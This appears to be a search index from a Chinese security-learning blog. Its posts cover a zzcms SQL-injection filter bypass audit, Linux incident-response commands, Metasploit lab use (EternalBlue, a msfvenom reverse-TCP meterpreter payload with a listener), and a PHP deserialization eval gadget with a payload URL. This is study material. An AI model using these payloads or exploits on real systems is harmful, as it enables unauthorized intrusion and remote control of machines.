<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>代码审计之SQL注入</title>
    <link href="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h4 id="代码审计初级"><a href="#代码审计初级" class="headerlink" title="代码审计初级"></a>代码审计初级</h4><p>seay代码审计工具-&gt;面向过程可用</p><p>审计思路:</p><p>1.通读网站,了解其路由方式,大概知道有什么过滤函数-&gt;优点:大概了解作者的编程思路和防御手法-&gt;但是耗时长</p><p>2.定位敏感函数和敏感关键词上下文调用流程了解和过滤手法.xdebug调</p><p>2019的zzcms审计:</p><p>在seay审计工具的帮助下快速找到切入点进行审计构造第一个数据包进行分析</p><p>因为前期已经尝试不正确方式去探测过滤手法,现在直接用绕过手法演示</p><p>注意 error_reporting(0)表示错误等级为0,并不会出现错误信息</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024132840941.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024131531482.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024131704209.png"></p><p>stopsqlin.php文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//主要针对在任何文件后加?%3Cscript%3E，即使文件中没有参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<span class="hljs-string">&#x27;script&#x27;</span>)!==<span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<span class="hljs-string">&#x27;%26%2399%26%&#x27;</span>)!==<span class="hljs-literal">false</span>|| <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<span class="hljs-string">&#x27;%2F%3Cobject&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;无效参数&quot;</span>);<span class="hljs-comment">//注意这里不能用js提示</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">zc_check</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$string</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123; <span class="hljs-comment">//判断是否开启全局gpc，如果没有开启则再加addslashes（）进行转移特殊字符操作</span><br> <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$string</span>)); <span class="hljs-comment">//把特殊字符实体化并过滤空格</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$string</span>)));<br>&#125;<br> &#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$string</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) <span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>] = <span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//进行循环遍历这个数组，并且进行过滤操作</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>)&#123; <span class="hljs-comment">//判断是否具有请求发送到</span><br><span class="hljs-variable">$_POST</span> =<span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//这里会进行整合，对应的请求参数赋给对应的值</span><br><span class="hljs-variable">$_GET</span> =<span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-variable">$_COOKIE</span> =<span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$_COOKIE</span>);<br>@<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>); <span class="hljs-comment">//从数组中将变量导入到当前的符号表 通俗易懂就是将数组的key作为变量名，数组的值作为变量的值</span><br>@<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><span class="hljs-comment">//特别的表单，需要特别提示的</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nostr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-comment">//strip_tags($str);</span><br><span class="hljs-variable">$sql_injdata</span> = <span class="hljs-string">&quot;&#x27;,/,\,&lt;,&gt;,�,select&quot;</span>;<br>    <span class="hljs-variable">$sql_inj</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_injdata</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$sql_inj</span>);<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>])!==<span class="hljs-literal">false</span>)&#123; <br><span class="hljs-title function_ invoke__">showmsg</span> (<span class="hljs-string">&quot;含有非法字符 [&quot;</span>.<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;] 返回重填&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<span class="hljs-comment">//没有的返回值</span><br>&#125;<br><br><span class="hljs-comment">//过滤指定字符,</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopsqlin</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$str</span>)) &#123;<span class="hljs-comment">//有数组数据会传过来比如代理留言中的省份$_POST[&#x27;province&#x27;][$i]</span><br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$str</span>);<span class="hljs-comment">//否则过过滤不全 //防止大小写绕过</span><br><br><span class="hljs-variable">$sql_injdata</span> = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义一个空字符串</span><br><span class="hljs-variable">$sql_injdata</span>= <span class="hljs-variable">$sql_injdata</span>.<span class="hljs-string">&quot;|&quot;</span>.stopwords; <span class="hljs-comment">//stopwords也是作者预先定义的敏感词过滤全局变量</span><br><span class="hljs-variable">$sql_injdata</span>=<span class="hljs-title function_ invoke__">CutFenGeXian</span>(<span class="hljs-variable">$sql_injdata</span>,<span class="hljs-string">&quot;|&quot;</span>);<br><br>    <span class="hljs-variable">$sql_inj</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$sql_injdata</span>); <span class="hljs-comment">//遍历以分割线为1分割字符串进行分割组成一个数组，</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$sql_inj</span>);<span class="hljs-variable">$i</span>++)&#123; <span class="hljs-comment">//遍历禁用词数组</span><br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>])!==<span class="hljs-literal">false</span>) &#123;<span class="hljs-title function_ invoke__">showmsg</span> (<span class="hljs-string">&quot;参数中含有非法字符 [&quot;</span>.<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;] 系统不与处理&quot;</span>);&#125;  <span class="hljs-comment">//判断我们传进来的参数是否在禁用数组，如果在调用showmsg函数</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$r_url</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]); <span class="hljs-comment">//对传入的uri赋值然后在进行判断是否为以下的uri，如果是则不进行stopsqlin（）的过滤sql关键字(注意哲理拿不到post得参数值,所以绕过操作只能痛过get来)</span><br><span class="hljs-keyword">if</span> (checksqlin==<span class="hljs-string">&quot;Yes&quot;</span>) &#123; <span class="hljs-comment">//这是一个作者预先定义的一个全局变量</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$r_url</span>,<span class="hljs-string">&quot;siteconfig.php&quot;</span>)==<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$r_url</span>,<span class="hljs-string">&quot;label&quot;</span>)==<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$r_url</span>,<span class="hljs-string">&quot;template.php&quot;</span>)==<span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$get_key</span>=&gt;<span class="hljs-variable">$get_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$get_var</span>);&#125; <span class="hljs-comment">/* 过滤所有GET过来的变量 */</span>      <br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post_key</span>=&gt;<span class="hljs-variable">$post_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$post_var</span>);&#125;<span class="hljs-comment">/* 过滤所有POST过来的变量 */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_COOKIE</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$cookie_key</span>=&gt;<span class="hljs-variable">$cookie_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$cookie_var</span>);&#125;<span class="hljs-comment">/* 过滤所有COOKIE过来的变量 */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$request_key</span>=&gt;<span class="hljs-variable">$request_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$request_var</span>);&#125;<span class="hljs-comment">/* 过滤所有request过来的变量 */</span><br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024131920703.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024132141839.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024132622890.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024133441291.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024133233839.png"></p><h6 id="其它注入点-后台的一个注入-需要登录"><a href="#其它注入点-后台的一个注入-需要登录" class="headerlink" title="其它注入点:后台的一个注入,需要登录"></a>其它注入点:后台的一个注入,需要登录</h6><p>cookie注入</p><p><a href="http://www.zz.com/admin/ask.php">http://www.zz.com/admin/ask.php</a></p><p>前期也要经过stopsqlin.php进行过滤,但是可以绕过</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024152015281.png"></p><p>只有管理员才能正常访问admin&#x2F;ask.php</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024153107248.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024152833284.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024152954181.png"></p><p>这个SQL注入回显位在数据包中显示</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024155637207.png"></p><p>admin&#x2F;bad.php也存在时间注入</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024164212216.png"></p><p>因为前面的绕过已经讲过了,现在就直接绕过这个文件的限制</p><p>id参数要求必为一个数组,好像只能用sleep(5)</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024164539008.png"></p><p>今晚自己再次卖力的审计发现还有一处sql注入点,当我看见echo输出的时候,眼睛都亮了.不管了直接喜欢union select 联合注入</p><p>注入点:admin&#x2F;sendmail.php</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024205223881.png"></p><p>需要groupid(必要的)我们就给他传进去</p><p>关键点:</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024205314312.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024211633170.png"></p><p>中间很傻淦,在哪数字段,三十八个,想想就憨批,对啊,就是三十八个,为啥一致字段数不匹配.一下子没反应过来它只显示一个字段</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024205723737.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024210825177.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计（SQL注入）</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应</title>
    <link href="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <url>/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<p>linux应急响应<br>1.查看用户信息<br>1.1查看特权用户<br>cat &#x2F;etc&#x2F;passswd  查看用户信息文件</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.jpg"></p><p>cat &#x2F;etc&#x2F;shadow 查看影子文件</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/2.jpg"></p><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd  查看系统是否还存在其它的特权账户,uid&#x3D;0,默认系统只存在root一个特权账户</p><p>cat &#x2F;etc&#x2F;passwd | grep x:0  查看系统是否还存在其它的特权账户,uid&#x3D;0,默认系统只存在root一个特权账户</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/3.jpg"></p><p>1.2 who查看当前登录的用户,以及其登录ip.pts代表远程登录,tty代表本地登录</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/4.jpg"></p><p>1.3w  查看目前登入的系统的用户,以及她们正在执行的程序</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/5.jpg"></p><p>1.4uptime  查看现在的时间,系统开机时长,目前多少用户登录,系统在过去的一分钟内的平均负载</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/6.jpg"></p><p>1.5 stat &#x2F;etc&#x2F;passwd 查看密码文件上一次的修改时间,如果最近被修改过,那就可能存在问题</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/7.jpg"></p><p>1.6  cat &#x2F;etc&#x2F;passwd | grep -v nologin 查看除了不可登录以外的用户都有那些,有没有新增的</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/8.jpg"></p><p>1.7 cat  &#x2F;etc&#x2F;passwd |grep &#x2F;bin&#x2F;bash 查看能用bash shell登录的用户</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/9.jpg"></p><p>2历史命令<br>2.1 history 查看历史执行的命令</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/10.jpg"></p><p>2.2 保存历史执行命令 cat .bash_history &gt;&gt; 1.txt</p><p>3.端口<br>3.1 netstat -puant 查看端口开放和链接情况</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/11.jpg"></p><p>3.2 ls -l &#x2F;proc&#x2F;pid&#x2F;exe 发现可疑的外联ip,即可根据对应的pid找到相应的执行文件</p><p>4.进程<br>4.1ps -aux 查看进程</p><p>4.2 查看关联进程 ps -aux | grep pid</p><p>4.3 ps -aux –sort&#x3D;pcpu |head -n  查看cpu前n位占用高的进程</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/12.jpg"></p><p>5.子启项<br>5.1 systemctl list-unit-files | grep enable</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/13.jpg"></p><p>6.定时任务<br>6.1 查看定时任务</p><p>6.2crontab -u root -l  查看root用户任务计划</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/14.jpg"></p><p>7.进程监控<br>7.1 top 进程动态监控,默认&#96;根据cpu的占用情况进行排序,按b可根据内存使用情况排序</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/15.jpg"></p><p>7.2 top -p pid 监控指定程序</p><p>7.3 ps -ef静态监控</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/16.jpg"></p><p>8.host文件<br>8.1cat &#x2F;etc&#x2F;hosts 查看host文件是否被篡改</p><p><img src="/2021/08/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/17.jpg"></p><p>9.登录日志<br>9.1grep “Failed password for root” &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>统计爆破主机root账号的失败次数及ip</p><p>9.2grep “Accepted “ &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $1,$2,$3,$9,$11}’<br>查看成功登录的日期、用户名、IP</p><p>10.命令状态<br>10.1stat &#x2F;bin&#x2F;netstat 查看命名修改时间，防止被替换</p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>use msf</title>
    <link href="/2021/08/23/msf/"/>
    <url>/2021/08/23/msf/</url>
    
    <content type="html"><![CDATA[<h5 id="内网shell管理器"><a href="#内网shell管理器" class="headerlink" title="内网shell管理器"></a>内网shell管理器</h5><p>metasploit framework(美少妇)–&gt;&gt;<a href="https://www.metasploit.com/">https://www.metasploit.com/</a> (官网)</p><p>1.启动控制台</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><h6 id><a href="#" class="headerlink" title></a></h6><p>实验一:</p><p>利用美少妇工具拿下windows7的最高权限(先把windows7的防火墙关了,第一次实验比较顺哈自我创造顺利环境)</p><p>1.利用老朋友永恒之蓝</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">search</span> ms17_010<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/msf/image-20221026163248794.png"></p><p>2.选择使用模块</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> <span class="hljs-number">3</span><br><span class="hljs-keyword">show</span> options 看要设置什么选项<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/msf/image-20221026163413220.png"></p><p>(requireed–&gt;yes必定要填的选项)</p><p>LOHOST-&gt;攻击机的ip</p><p>RHOSTS-&gt;对方ip</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> RHOSTS +你的ip<br><span class="hljs-built_in">run</span>/exploit<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/msf/image-20221026163747318.png"></p><p>(不好意思,我已经把补丁打了)</p><h6 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h6><p>1.生成木马,paylad为反向连接</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">msfvenom -<span class="hljs-keyword">p</span> windows/meterpreter/reverse_tcp LHOST=(攻击机的ip地址) LPORT=(本机的端口开放给受害机连接) -<span class="hljs-keyword">f</span> <span class="hljs-keyword">exe</span> &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span>  <br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/msf/image-20221026164949461.png"></p><p><img src="/2021/08/23/msf/image-20221026165041741.png"></p><p>2.在美少妇哪里设置监听器</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler <br>show <span class="hljs-keyword">options</span> 查看配置选项<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp(</span>这个一定要和你设置木马的连接方式一致<span class="hljs-comment">)</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.138.130(</span>攻击机的地址<span class="hljs-comment">)</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span> 监听端口<br></code></pre></td></tr></table></figure><p>3.把shell.exe放到受害机器一管理员身份运行</p><p>4.msf监听到连接</p><p>扫盲区:<br>大马:大(已经集成好了所有命令，不需要向外进行调用)<br>小马:小(里面只具备上传下载，转发命令功能)</p><p>一句话木马(也是小马之一): webshell管理器(蚁剑,冰蝎)向我们写的小马发送数据包，让小马调用函数去执行命令<br>上传: ?cmd&#x3D;upload&#x3D;xxxxxX&#x2F;&#x2F;xxXx</p><p>大马是一个集成多个代码的木马，我们利用大马就不再需要webshell管理器，因为他本身已经就是webshell管理器了(直接通过网页方式访问它并操作)</p><p>正向连接:<br>反向连接:</p><p><img src="/2021/08/23/msf/image-20221026173349106.png"></p>]]></content>
    
    
    <categories>
      
      <category>滲透工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化1</title>
    <link href="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h5 id="php反序列化操作"><a href="#php反序列化操作" class="headerlink" title="php反序列化操作"></a>php反序列化操作</h5><p>__tostring(): 当把对象当成字符串输出时调用该方法.</p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221014170220275.png"></p><p>为什么要进行序列化和反序列化:</p><p><strong>下次需要实例化一个类时，只需反序列化将该类实例化到内存中，并在序列化时保留该类中的所有变量和状态。</strong>帮我们自动使用类,不用手动加载</p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221014172205671.png"></p><p>___sleep():序列化时,____sleep()自动调用 &#x2F;&#x2F;必须返回数组类型</p><p>__wakeup():反序列时调用 &#x2F;&#x2F;对返回值没有明文要求</p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017100526588.png"></p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017101354874.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">one</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;b);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">one</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;one&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2</span>]);<br><br>http:<span class="hljs-comment">//127.0.0.1/12.php?2=O:7:%22Student%22:1:&#123;s:1:%22a%22;O:3:%22one%22:1:&#123;s:1:%22b%22;s:10:%22phpinfo();%22;&#125;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 